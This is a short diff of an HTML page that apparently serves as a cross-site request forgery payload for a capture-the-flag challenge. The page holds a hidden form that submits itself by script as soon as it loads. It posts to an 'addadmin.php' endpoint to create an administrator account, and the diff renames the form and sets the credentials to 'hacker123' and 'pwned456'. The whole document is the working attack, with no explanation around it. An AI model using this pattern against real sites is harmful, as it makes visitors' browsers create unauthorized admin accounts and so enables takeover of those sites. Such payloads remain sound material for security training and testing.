@@ -1,11 +1,11 @@
 <html>
   <body>
-    <form action="https://skrctf.me/ports/71f73fb1e3b7d6dc0b4f82f76ae542fd/addadmin.php" method="POST" id="f">
-      <input type="hidden" name="username" value="123">
-      <input type="hidden" name="password" value="123">
+    <form id="csrf" action="https://skrctf.me/ports/71f73fb1e3b7d6dc0b4f82f76ae542fd/addadmin.php" method="POST">
+      <input type="hidden" name="username" value="hacker123">
+      <input type="hidden" name="password" value="pwned456">
     </form>
     <script>
-      document.getElementById('f').submit();
+      document.getElementById("csrf").submit();
     </script>
   </body>
 </html>
